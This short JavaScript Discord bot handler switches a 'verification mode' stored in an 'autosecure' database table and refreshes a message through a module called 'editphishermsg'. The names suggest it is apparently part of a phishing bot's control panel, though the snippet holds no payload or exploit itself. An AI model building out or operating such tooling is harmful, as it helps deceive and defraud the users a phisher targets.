const { queryParams } = require("../../../db/database");
const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");

module.exports = {
    name: "changemode",
    editphisher: true,
    callback: async (client, interaction) => {
        await interaction.deferUpdate();
        let [t, botnumber, ownerid, newtype] = interaction.customId.split("|");

        newtype = parseInt(newtype);
        
        if (isNaN(newtype) || ![0, 1, 2].includes(newtype)) {
            return interaction.followUp({ content: "Error: invalid verification mode.", ephemeral: true });
        }

        await queryParams(
            `UPDATE autosecure SET verification_type = ? WHERE user_id = ? AND botnumber = ?`,
            [newtype, ownerid, botnumber]
        );

        const msg = await editphishermsg(botnumber, ownerid, interaction.user.id);
        interaction.editReply(msg);
    }
};
